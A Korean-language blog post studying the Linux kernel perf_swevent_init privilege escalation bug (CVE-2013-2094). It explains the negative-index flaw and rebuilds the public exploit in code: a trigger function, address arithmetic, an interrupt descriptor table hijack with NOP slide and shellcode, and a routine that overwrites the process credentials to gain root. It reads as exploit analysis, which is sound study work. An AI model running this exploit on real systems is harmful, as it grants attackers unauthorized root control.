---
layout: post
title: "CVE-2013-2094 kernel: perf_swevent_enabled array out-of-bound access"
date: 2015-07-18 19:41:53 +0900
comments: true
categories: 
---

* [CVE-2013-2094 kernel: perf_swevent_enabled array out-of-bound access](https://bugzilla.redhat.com/show_bug.cgi?id=962792#c16)
* [A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)](http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/)
* [github](https://github.com/realtalk/cve-2013-2094)
* [Brad Spengler](https://dl.packetstormsecurity.net/1403-exploits/perf_swevent_init.c)
* [Phrack #64 file 6, Attacking the Core : Kernel Exploiting Notes](http://phrack.org/issues/64/6.html#article)
* [Intel: Interrupt and Exception Overview](http://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html)

#### C basics

`-1` 로 indexing 이 되는 상황이 여기있다. `uint32` -> `int32` -> `int64` 로 거치면서 negative indexing 이 되는 상황.

``` c increment
main()
{
    int a[10] = { 0,1,2,3,4,5,6,7,8,9 };
    int * b;
    uint32_t config = -1;
    int32_t index; 
    int64_t index64;

    b = &a[1];

    index = config;
    index64 = index;
    printf("%d\n",b[index64]]);
    printf("&b: %p\n", &b[0]);
    printf("& : %p\n", &b[index64]);
    //atomic_inc(&b[index64]);
}
$ ./atomic_inc
0
&b: 0x7fff4f7407b4
& : 0x7fff4f7407b0
```

원래 `&b[0]` 이 kernel address 였으면 -1 indexing 정도는 마찬가지로 kernel address 가 된다. base - 4 * abs(index) 에 위치한 값이 increment 된다. kernel memory 를 increment 할 수 있는 primitive 를 가지게 된 셈이다. 

``` c decrement
main()
{
    int * b;
    uint32_t config = -1;
    uint64_t uindex64;
    int64_t index64;

    uindex64 = config;
    printf("uindex64: %p\n", uindex64);
    index64 = uindex64;

    b = 0xffFFffFF81f360c0;

    printf("&b: %p\n", &b[0]);
    printf("& : %p\n", &b[index64]);
    //atomic_dec(&b[index64]);
}
$ ./atomic_dec
uindex64: 0xffffffff
&b: 0xffffffff81f360c0
& : 0x381f360bc
```

kernel memory 였던 `0xffffffff81f360c0` 이 `+ 0xffffffff` overflow 해서 user-land 인 `0x381f360bc` 로 넘어가버렸다. `0x381f360bc` 를 알면 원래 `b` 를 알 수 있을까? 있다.

``` c calc_orginal_base.c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <syscall.h>

main()
{
    int *b = (int*)0xffFFffFF81f360c0;
    int *p = (int*)0x381f360bc;
    int *o;

    o = p - (uint64_t)0xffFFffFF;

    printf("%p\n",o);
}
$ ./calc_original_base
0xffffffff81f360c0
```

즉, 

1. user-land 에 메모리를 잡아놓고, 
2. 그 메모리를 0 으로 초기화한다음에, 
3. atomic_dec() 를 `config == -1` 로 트리거한다음에,  
4. 메모리를 스캔해서 0 에서 바뀐 메모리 offset 을 알아내고,
5. 그 메모리에서 0xffFFffFF 를 빼면 perf_swevent_enabled 의 주소를 얻게 되는 것이다.
6. 이 주소를 기반으로 `asm sidt` 에서 얻은 IDT 주소를 인풋으로 계산해서, vulnerable 한 perf_swevent_init() 을 트리거시키는 것이다. perf_swevent_open() 을 통해서. 
7. 그러면 IDT 의 vector offset 주소의 상위 4 바이트 0xffFFffFF 가 atomic_inc() 되면서, 0x0 이 되고, interrupt 를 처리하는 vector 주소가 커널에서 user-land 로 바뀌게 된다.
8. 그 주소에는 이미 NOP slide + shell code 가 들어가있어서,
9. 인터럽트를 발생시키면 kernel priv. 로 shell code 가 수행된다.
10. shell code 는 current task 의 credential structure 를 찾아서, uid/gid 를 0 으로 바꾸고, int 0x4 관련 Interrupt descriptor 를 원복하는 일을 한다.
11. 이제 `asm("int $0x4");` 로 인터럽트 수행. shell code 가 ring0 priv. 로 돈다.
12. 정리하면 -1 에 대해서, destroy path 에서 user-land 메모리를 dec() 하고, 같은 -1 에 대해서, init/open path 에서 kernel 메모리를 inc() 한다.

어쨌건 kernel memory 일부 영역을 increment 할 수 있는 primitive 를 얻게 되었다.

`0xffffffff........` 인 어드레스의 top 32-bits 에 inc() 를 걸면 0 으로 변한다. 커널주소를 user-land 주소로 바꾸는 primitive 를 얻은 셈이다.

#### signed/unsigned

`perf_swevent_init` 는 `kernel/events/core.c` 에 defined.

```
static init perf_swevent_init(struct perf_event *event)
{
    int event_id = event->attr.config;

    if (event->attr.type != PERF_TYPE_SOFTWARE)
        return -ENOENT;

    ...
    if (event_id >= PERF_COUNT_SW_MAX)
        return -ENOENT;

    ...
    static_key_slow_inc(&perf_swevent_enabled[event_id]);
    ...
}
```

event_id 는 `int event_id = event->attr.config` 로 `signed` 변수.

`event->attr.config` 의 31st bit 이 세팅이되면 event_id 는 negative value 가 된다.

negative value 가 되면 `if (event_id >= PERF_COUNT_SW_MAX)` 를 통과하게 된다.

통과하면 `static_key_slow_inc(&perf_swevent_enabled[event_id])` 에 들어가는데.

static_key_slow_int() 는 `kernel/jump_label.c` 에 등록되어있다.

``` c static_key_slow_inc()
void static_key_slow_inc(struct static_key *key)
{
    if (atomic_inc_not_zero(&key->enabled))
        return;

    jump_label_lock();

    if (atomic_read(&key->enabled) == 0) {
        ...
    }
    atomic_inc(&key->enabled);
    jump_label_unlock();
}
```

그리고 `perf_swevent_enabled` 는 

```
struct static_key {
    atomic_t enabled;
    struct jump_entry *entries;
#ifdef CONFIG_MODULES
    struct static_key_mod *next;
#endif
};

struct static_key perf_swevent_enabled[PEF_COUNT_SW_MAX]
```

즉 `atomic_t` 에 대한 `atomic_inc()` 가 들어가는 상황. 근데 index 가 negative 면, 엉뚱한 메모리에 대해서 atomic_inc() 가 들어갈 수 있음.

근데, 설명을 보면 `atomic_t perf_swevent_enabled[PERF_COUNT_SW_MAX]` 라고 되어있음. 커널 버전에 따라 다른가 의심됨.

하여간 설명이 맞다고 하면, `perf_swevent_enabled[]` 는 integer array 이고. negative indexing 이 되는 상황을 가정해보면.

`event_id` 가 64-bit 로 sign extended 되고. `event_id` 가 -1 라고 하면, 

`0xffffffff` -> `0xffffffffffffffff` 가 된다.

인덱싱되는 어드레스는 `event_id * sizeof(int)` + &perf_swevent_enabled 가 된다.

```
$ cat /boot/System.map-2.6.32-358.el6.x86_64 | grep perf_swevent_enabled
ffffffff81f360c0 B perf_swevent_enabled
```

하면 `perf_swevent_enabled` 의 주소가 나오는데.

`event->attr.config == 0xffffffff` 라고 하면,

`0xffFFffFFffFFffFF * 4 + 0xffffffff81f360c0 == 0xffFFffFF81f360bc`

이 되고. 

`event->attr.config == 0xfffffffe` 라고 하면,

`0xffFFffFFffFFffFe * 4 + 0xffffffff81f360c0 == 0xffFFffFF81f360b8`

이 된다.

커널 메모리를 inc 하게 되는 셈인데.

이제 `sw_perf_event_destroy()` 를 보면.

`u64 event_id = event->attr.config;` 로 되어있다.

이 코드는 destroy 쪽 code path 이다. perf_swevent_open() 으로 만들어진 fd 가 close() 될 때, 수행되는 코드이다.

```
5112 static void sw_perf_event_destroy(struct perf_event *event)
5113 {
5114         u64 event_id = event->attr.config;
5115 
5116         WARN_ON(event->parent);
5117 
5118         static_key_slow_dec(&perf_swevent_enabled[event_id]);
5119         swevent_hlist_put(event);
5120 }
```

이 경우, `event->attr.config == 0xffFFffFF` 라고 하면, 

`(u64)0xffFFffFF * 4 + 0xffFFffFF81f360C0 == 0x0000000381F360bc`

이번에는 user space 를 inc() 들어간다.

이제 exploit code 로 가보자.

#### mmap & MAP_FIXED

MAP_FIXED 로 하면, a specified address 에 메모리를 alloc 해달라고 요청할 수 있다.

#### syscall wrapper

`/usr/include/asm/unistd_64.h` 에서 symbolic constant 를 얻을 수 있다.

`#define __NR_getpid    39` 같은.

#### Interrupt Descriptor table and sidt

register `IDTR` 은 다음과 같은 structure 를 track 하고 있는데.

```
// 64bit IDTR structure
struct {
    uint16_t limit;
    uint64_t addr;
} __attribute__((packed)) idtr;
```

reg `IDTR` 을 조작할때는 `sidt` & `lidt` instruction 을 사용. `lidt` 는 kernel 에서 호출. `sidt` 는 user-land 에서도 가능.

#### Linux kernel performance monitoring interface

`perf_event_open` -> fd 를 얻을 수 있다. `perf_event_open` 은 결국 `perf_swevent_init` 를 호출.

#### Buggy increment in the kernel

```
// first arg to perf_event_open
struct perf_event_attr {
    __u32       type;
    __u32       size;
    __u32       config
    ...
}
```

#### Buggy decrement in the kernel

```
static void sw_perf_event_destroy(struct perf_event *event)
{
    u64 event_id = event->attr.config;

    ...
    atomic_dec(&perf_swevent_enabled[event_id]);
    ...
}
```

event_id 는 64 bit 가 되니까 엄청나게 큰 레인지를 addressing 할 수 있다. perf_swevent_enabled 가 integer array 라면 multiplied by 4 가 되어서.

#### mmap()

* mmap() / MAP_FIXED 로 초기 메모리를 alloc 한다. 

```
#define BASE        0x380000000
#define SIZE        0x010000000 // 256 megabytes
#define KSIZE       0x002000000 // 32 megabytes
map = mmap((void *) BASE, SIZE, PROT_READ | PROT_WRITE, 
                MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,
                -1,
                0);
if (map != (void *) BASE) {
    fprintf(stderr, "mmap was unable to get fixed address: %lx\n", BASE);
    exit(EXIT_FAILURE);
}
memset(map, 0, SIZE);
```

BASE 가 `0x380000000` 로 잡힌 이유는

```
$ cat /boot/System.map-2.6.32-358.el6.x86_64 | grep perf_swevent_enabled
ffffffff81f360c0 B perf_swevent_enabled
```

* perf_swevent_enabled array 가 0xffffffff81f360c0 이고.

* config 로 -1 을 던지면, dec 는 0x0000000381F360bc 에 동작하게되고.

`0xffFFffFF * 4 + 0xffFFffFF81f360C0 == 0x0000000381F360bc`

* config 를 -2 로 던지면, dec 는 0x0000000381F360b8 에 가게된다.

그러니까 memory region 0x380000000 ~ 0x390000000 로 가면, config 를 -1,-2 로 던질때 dec 되는 address 를 커버한다.

#### break_perf_event_open(-1)

```
static void break_perf_event_open(uint32_t off) {
    struct perf_event_attr pea = {
        .type = PERF_TYPE_SOFTWARE;
        .size = sizeof(struct perf_event_attr),
        .config = off,
        .mmap = 1,
        .freq = 1,
    };

    int fd = syscall(__NR_perf_event_open,
                        &pea, // struct perf_event_attr __user *attr_uptr
                        0, // pid_t pid (target pid)
                        -1, // int cpu (target cpu)
                        -1, // int groud_fd (group leader fd)
                        0); // unsigned long flags

    if (fd < 0) {
        perror("perf_event_open");
        exit(EXIT_FAILURE);
    }
    if (close(fd) != 0) {
        perror("close");
        exit(EXIT_FAILURE);
    }
    return;
}
```

#### Find the offset into the memory region where the write occurred

이제 config -1 & -2 로 dec 된 메모리를 찾는다.

i.e. `0x381f360b8`, `0x381f360bc` 가 dec 되야한다. 

```
for (i = 0; i< SIZE/4;i++) {
    uint32_t *tmp = map+i;
    if (*tmp && *(tmp +1))
        break;
}
```

#### The Interrupt Descriptor Table (IDT)

x86 아키텍쳐에서 인터럽트 벡터 테이블을 구현하기위한 데이터 구조. CPU 가 인터럽트나 익셉션에 대응하기 위해 필요하다. IDT 는 256 개의 벡터로 구성되어있다. IDT 는 물리 메모리 어디든 존재할 수 있는데, IDTR 이란는 특수 레지스터에 the physical base address / the length in bytes of the IDT 가 저장된다.

x86_64 에서는, 다음과 같이 나타낼 수 있다.

```
struct {
    uint16_t limit;
    uint64_t addr;
} __attribute__((packed)) idt;
```

#### IDTR

64-bit IDT entry's handler offset 을 변경하는 것이 핵심이다.

일단 IDTR 을 찍어보면

```
$ cat idtr.c
...
main()
{
    struct {
        uint16_t limit;
        uint64_t addr;
    } __attribute__((packed)) idt;
    uint64_t kbase;
    asm volatile ("sidt %0" : "=m" (idt));
    printf("%016lx:%04x\n", idt.addr, idt.limit);
    kbase = idt.addr & 0xff000000;
    printf("%016lx\n", kbase);
}
$ ./idtr
ffffffff81df8000:0fff
0000000081000000
```

앞의 `0xffffffff` 에 increment 가 들어가서 `0x00000000` 으로 바뀌는게 exploit 의 핵심이다.

#### Incrementing the address of an IDT handler

공개된 exploit 에서는 interrupt 0x4 를 hijack 했다. 

{% img /images/interrupts.png %}

16-byte descriptor 구조를 보면,

{% img /images/id.png %}

```
Offset  Size    Description
0       2       Offset low bits (0..15)
2       2       Selector (Code segment selector)
4       1       Zero
5       1       Type and Attributes (same as before)
6       2       Offset middle bits (16..31)
8       4       Offset high bits (32..63)
12      4       Zero
```

offset 8 의 경우, x86_64 에서 0xffFFffFF 가 될텐데, 이걸 atomic_inc() 시키는게 목표가 된다.

1. 0x4 번 인터럽트에 해당하는 interrupt descriptor 를 corrupt 시켜야하는데.
2. 0,1,2,3 4*16 = 64. hex(64) = 0x40
3. offset 8 에 위치한 4 byte 를 atomic_inc() 시켜야하니까, 0x40 + offset 8 = 0x48
4. idt.addr + 0x48 부터 위치한 4 byte 에 atomic_inc() 가 들어가야한다.
5. 나중에 `uint32_t *fixptr; fixptr = idt.addr + 0x48; *fixptr = -1` 로 원복이 들어가야한다.

Ubuntu 12.04 에서 

1. idt.addr == 0xffffffff81df8000
2. perf_swevent_enabled == 0xffffffff81ef7160

즉 idt.addr + 0x48 은 perf_swevent_enabled 앞에 위치함.

1. target address 는 idt.addr + 0x48 (kernel 에 있음)
2. (perf_swevent_enabled - idt.addr - 0x48) / 4 하면 minus 로 얼마나 index 를 땡겨야하는지 나옴. perf_swevent_enabled(-index) 
3. perf_swevent_enabled + (int64_t)0xffffffff * 4 == 0x380000000 + i*4 (overflow 나서)

1+2+3 을 조합하면 break_perf_event_open() 에 negative 로 얼마를 줘야하는지 나옴.

``` c calc2.c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <syscall.h>
#include <stdint.h>
#include <assert.h>
main()
{
    int *idt_addr = (int*)0xffffffff81df8000;
    int *target_addr = idt_addr + 0x48;
    int *perf_swevent_enabled = (int*)0xffffffff81ef7160;
    int *peek;

    uint32_t config = 0xffffffff;
    int32_t idx32;
    uint64_t uidx64;
    int64_t idx64;

    idx64 = config;
    peek = &perf_swevent_enabled[idx64];

    printf("atomic_dec(): %p\n", &perf_swevent_enabled[idx64]);
}
$ ./calc2
atomic_dec(): 0x381ef715c
```

그럼 i 가 `0x381ef715c - 0x380000000 == 0x1ef715c` 에서 `0x1ef715c/4 == 0x7bdc57`라는 걸 알 수 있다.

```
break_perf_event_open( -i + (((idt.addr & 0xffffffff) - 0x80000000)/4) + 16);
```

break_perf_event_open() 에 들어갈 값을 프로그램으로 검증해본다.

```
...
main()
{
    int *idt_addr = (int*)0xffffffff81df8000;
    int *target_addr = (int*)((uint64_t)idt_addr + (uint64_t)0x48);
    int *perf_swevent_enabled = (int*)0xffffffff81ef7160;

    int *calc_perf;

    int *peek;
    int *mem;

    int i;
    struct { 
        uint16_t limit; uint64_t addr; 
    } __attribute__((packed)) idt;

    uint32_t config = 0xffffffff;
    int32_t idx32;
    uint64_t uidx64;
    int64_t idx64;

    uint32_t *map = NULL;

    uint64_t a,b;

#define BASE    0x380000000
#define SIZE    0x010000000 // 256 mega
#define KSIZE   0x002000000 // 32 mega

    map = mmap((void*)BASE, SIZE, PROT_READ | PROT_WRITE,
            MAP_FIXED | MAP_ANONYMOUSE | MAP_PRIVATE, -1, 0);
    if (map != (void*)BASE) {
        fprintf(stderr,"mmap error\n");
        exit(1);
    }
    
    idx64 = config;
    peek = &perf_swevent_enabled[idx64];

    printf("atomic_dec(): %p\n", peek);
    *peek = 0x1;

    config = 0xfffffffe;
    idx64 = config;
    peek = &perf_swevent_enabled[idx64];
    printf("atomic_dec(): %p\n", peek);
    *peek = 0x1;

    for (i = 0; i<SIZE/4;i++) {
        uint32_t *tmp = map+i;
        if (*tmp && *(tmp+1))
            break;
    }
    printf("scanned i: %x\n",i);

    i = ((uint64_t)peek - 0x380000000) / 4;
    printf("caculated i: %x\n", i);

    printf("A: %p\n", &perf_swevent_enabled[0xffffffff*2]);
    printf("B: %p\n", (void*)((uint64_t)BASE + (uint64_t)i*4));
    printf("C: %p\n", (int*)perf_swevent_enabled + 0xffffffff*2);

    // perf_swevent_enabled 를 i 를 가지고 구해낼 수 있다.
    b = (uint64_t)BASE + (uint64_t)i*4;
    calc_perf = (int*)(b-(uint64_t)0xffffffff*4*2);
    printf("calc_perf: %p\n", calc_perf);
    printf("perf_swevent_enabled: %p\n", perf_swevent_enabled);

    // perf_swevent_enabled 의 주소를 구했으면,
    // target_addr 로 튈 수 있는, 어레이 index 를 계산한다.
    a = (uint64_t)calc_perf&0xffffffff;
    b = (uint64_t)target_addr&0xffffffff;
    printf("X: %lx\n", a);
    printf("Y: %lx\n", b);
    printf("Z: %ld\n", a-b);
    printf("-Z/4: %ld\n", (int64_t)(b-a)/4);
    config = (b-a)/4;
#if 0
    // exploit 의 공식. 하지만 안쓴다.
    config = 
        (uint32_t) 
        (-i +16 +((((uint64_t)idt_addr&0xffffffff)-0x80000000) / 4));
#endif
    idx32 = config; // 원래 code 의 실수를 시뮬레이션한다.
    idx64 = idx32;
    mem = &perf_swevent_enabled[idx64];
    printf("calculated mem: %p\n", mem);
    printf("target_addr: %p\n", target_addr);
    // kernel 에서는 이제 atomic_inc() 가 들어간다.
    // Interrupt descriptor 의 상위 0xffffffff -> 0x00000000 으로 변한다.
    // Interrupt vector 의 어드레스가 user-land 로 바뀐다.
    // user-land 에 깔아둔 NOP slide + shellcode 로 튈 수 있다.
    // atomic_inc(perf_swevent_enabled[idx64]);
}
$ ./calc2
atomic_dec(): 0x381ef715c
atomic_dec(): 0x381ef7158
scanned i: 7bdc56
calculated i: 7bdc56
A: 0x381ef7158
B: 0x381ef7158
C: 0x381ef7158
calc_perf: 0xfffffffb81ef7160
perf_swevent_enabled: 0xfffffffb81ef7160
X: 81ef7160
Y: 81df8048
-Z/4: -261190
config: -261190
idx32: -261190
idx64: -261190
calculated mem: 0xffffffff81df8048 <--- index overflow 로 맞춰냈다.
target_addr: 0xffffffff81df8048 <--- *
$
```

이 정도로 바꿔놓고 `int $0x4` 를 발생시키면, kernel panic 이 날텐데, 대충 코드가 어디로 튈지 알 수 있다.

```
#define KSIZE       0x002000000 // 32 megabytes
```

exploit code 상에서는
`kbase = idt.addr & 0xff000000` 로 해서, 0x02000000 바이트를 확보한다.

```
asm volatile("sidt %0" : "=m" (idt));
kbase = idt.addr & 0xff000000;

code = mmap((void*)kbase,KSIZE, PROT_READ|PROT_WRITE|PROT_EXEC,
        MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

memset(code, 0x90, KSIZE);

code += (KSIZE-1024);
memcpy(code,&fix_idt_and_overwrite_creds, 1024);
memcpy(code-shellcode_sz,shellcode,shellcode_sz);
```

로 NOP slide + shellcode 를 깐다.

#### Shellcode

```
swapgs
callq <shellcode + 0xd>
swapgs
iretq
```

인터럽트 핸들러는 `swapgs` 로 들어가야한다. 그리고 `iretq` 로 리턴.

#### task_struct & cred

target 이 되는 구조체.

우선 kernel stack 에서 thread_info 를 찾는다. thread_info 에서 task_struct 을 찾는다.

```
struct thread_info {
    struct task_struct *task;
    ...

struct task_struct {
    const struct cred *real_cred;
    ...

struct cred {
    uid_t       uid;
    gid_t       gid;
    uid_t       suid;
    gid_t       sgid;
    uid_t       euid;
    gid_t       egid;
    uid_t       fsuid;
    gid_t       fsgid;
    unsigned    securebits;
    kernel_cap_t    cap_inheritable;
    kernel_cap_t    cap_permitted;
    kernel_cap_t    cap_effective;
    ...
```

#### fix_idt_and_overwrite_creds

Interrupt handler 에서 `fix_idt_and_overwrite_creds()` 를 call 한다. 일단 user-land 에 memcpy 로 function 을 쭉 copy 해놓긴 했는데, relative addressing 으로 런타임에 다 resolving 이 될까? 이건 좀 체크해봐야겠다. 

1. 하여튼, handler 에서 호출을 하였으니, 
2. kernel stack 에서 놀게 될 것이고, 
3. 변수들이 kernel stack 에 자리잡을테고,
4. 거기서 thread_info 를 찾아낸다.
5. ~(8192-1) 로 masking 해서.

kernel memory 를 스캔해서, heuristic 하게 cred structure 를 찾는다. 찾으면 각종 uid/gid 들을 0 으로 세팅한다. 그러면 root 가 된다.

```
static void fix_idt_and_overwrite_creds() {
    int i,j,k;

    // 동적으로 알아내야할 정보들이 있어서
    // 일단 marker 로 place 를 holding 하고.
    uint64_t uids[4] = { 
        GENERATE_MARKER(2),
        GENERATE_MARKER(3),
        GENERATE_MARKER(4),
        GENERATE_MARKER(5)
    };
    
    // kernel stacks are usually 8192 bytes on Linux.
    // thus, we can take the address of a stack allocated variable
    // and mask off a few bits to find
    // what is the base of the kernel stack
    // where the thread_info struct lives.

    // current is (hopefully) pointing at the start of thread_info 
    // which contains
    // the current task_struct pointer.
    uint8_t *current = *(uint8_t **)( ((uint64_t)uids) & (-8192) );
    // the task_struct is allocated is kernel memory.
    // grab the top 28 bits to use as an estimate
    // to determine if other addresses are kernel addresses.
    uint64_t kbase = ( (uint64_t) current) >> 36;

    uint32_t *fixptr = (void*)GENERATE_MARKER(1);
    *fixptr = -1;
    for (i=0;i<4000;i+=4){
        // hopefully, p is pointing at part of the current
        // task's task_struct
        uint64_t *p = (void*)&current[i];
        // t is pointing at the start of the memory region
        // p points to, which (hopefully) is the real_creds
        // struct in our process' task_struct
        uint32_t *t = (void*)p[0];
        // we believe that p[0] is a pointer to real_creds,
        // and so t is pointing to real_creds.
        if ( (p[0] != p[1]) || ( (p[0]>>36) != kbase))
            continue;
        for (j=0;j<20;j++) {
            // there are 8 32-bit uid/gid fields
            // that we will check
            // to ensure they match our process' uid/gid
            for (k=0;k<8;k++){
                if (((uint32_t*)uids)[k] != t[j+k]){
                    goto next;
                }
            }
            // t[j] is the first 32-bit uid field in struct
            // cred.
            // this loop sets all 8 uid/gid fields to root
            for (i=0;i<8;i++)
                t[j+i] = 0;
            // sets the capability sets to -1.
            for (i=0;i<10;i++)
                t[j+9+i] = -1;
            return;
        next:
            ;
        }
    }
}
```
